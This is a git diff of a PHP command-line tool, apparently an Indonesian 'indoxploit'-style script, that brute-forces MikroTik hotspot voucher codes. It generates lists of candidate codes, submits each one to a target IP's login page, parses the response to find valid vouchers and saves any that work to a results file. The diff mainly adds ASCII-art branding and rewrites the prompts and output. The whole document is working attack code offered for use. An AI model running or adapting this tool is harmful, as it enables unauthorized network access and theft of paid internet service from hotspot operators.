@@ -53,11 +53,11 @@ $result = curl_exec($ch);
 curl_close($ch);
 $result = explode('<div class="notice">kode voucher/user', $result);
 $result = explode('sesuai, masukkan kembali dengan benar.</div>', $result[1]);
-echo $result[0];
+// echo $result[0];
 if (preg_match('/tidak/i', $result[0])) {
-	echo "{$red} [ - ]{$putih} ".$ip."{$lblue2} | {$putih}".$post." {$red} Code Failed!!\n";
+	echo "{$red} [ {$putih}- {$red}]{$putih} [ {$putih}".$result[0]." {$putih}]{$lblue2} | {$putih}".$post." {$red} C0d3 Failed!!\n";
 }else{
-	echo "{$green2} [ + ]{$putih} ".$ip."{$lblue2} | {$putih}".$post." {$green2} Code Valid!!\n";
+	echo "{$green2} [ {$putih}+ {$green2}]{$putih} [ {$putih}".$result[0]." {$putih}]{$lblue2} | {$putih}".$post." {$green2} C0d3 Valid!!\n";
 	mkdir("Result");
 	$date = "Result/Voucher Valid".date('d F Y');
 	$fopen = fopen($date.'.txt', 'a');
@@ -65,9 +65,33 @@ if (preg_match('/tidak/i', $result[0])) {
 }
 
 };
-echo "{$lblue2}[ 1 ] {$putih}Generate List
-{$lblue2}[ 2 ] {$putih}BruteForce Attack\n";
-$key = readline("[ * ] root@indoxploit# ");
+echo "{$green2} 	___________________________
+	< root@indoxploit:~# KM37ID >
+	 ---------------------------
+	   \         ,        ,
+	    \       /(        )`
+	     \      \ \___   / |
+	            /- _  `-/  '
+	           (/\/ \ \   /\
+	           / /   | `    \
+	           O O   ) /    |
+	           `-^--'`<     '
+	          (_.)  _  )   /
+	           `.___/`    /
+	             `-----' /
+	<----.     __ / __   \
+	<----|====O)))==) \) /====>
+	<----'    `--' `.__,' \
+	             |        |
+	              \       /
+	        ______( (_  / \______
+	      ,'  ,-----'   |        \
+	      `--{__________)        \/
+";
+echo "\n{$lblue2}  [ {$putih}#{$lblue2} ]{$putih} Tool/by: Mikrotik BruteForce/KM37ID\n\n";
+echo "{$lblue2}[ {$putih}1 {$lblue2}] {$putih}Generate List
+{$lblue2}[ {$putih}2 {$lblue2}] {$putih}BruteForce Attack\n";
+$key = readline("[ ? ] root@indoxploit:~# ");
 if ($key == 1) {
 	$genjum = readline("[ # ] Line : ");
 	$i = 0;
@@ -78,13 +102,13 @@ if ($key == 1) {
 	fwrite($fopengen, $genlist."\n");
 	$i++;
 	}
-	echo "{$green2} [ + ] C0d3 berhasil di Buat nama File list.txt!!\n";
+	echo "{$green2}[ {$putih}+ {$green2}] {$putih}C0d3 berhasil di Buat nama File {$lblue2}list.txt!!{$putih}\n";
 }else{
 echo "\n";
-$ip = readline(" [ # ] IP Address: ");
-$dom = readline(" [ # ] List File: ");
-$file_domain = file_get_contents($dom);
-	echo "\n{$lblue2} [ # ]{$putih} IP Address {$lblue2} | {$putih} Voucher {$lblue2} [ # ]\n";
+$ip = readline(" [ ? ] IP Address: ");
+$file_domain = file_get_contents("list.txt");
+	echo "\n{$lblue2} [ # ]{$putih} IP Address: $ip";
+	echo "\n{$lblue2} [ # ]{$putih} Response {$lblue2} | {$putih} Voucher {$lblue2} [ # ]";
 	for ($n=0; $n <= 9999999 ; $n++) { 
 
 		$exp_domain = explode("\n", $file_domain);
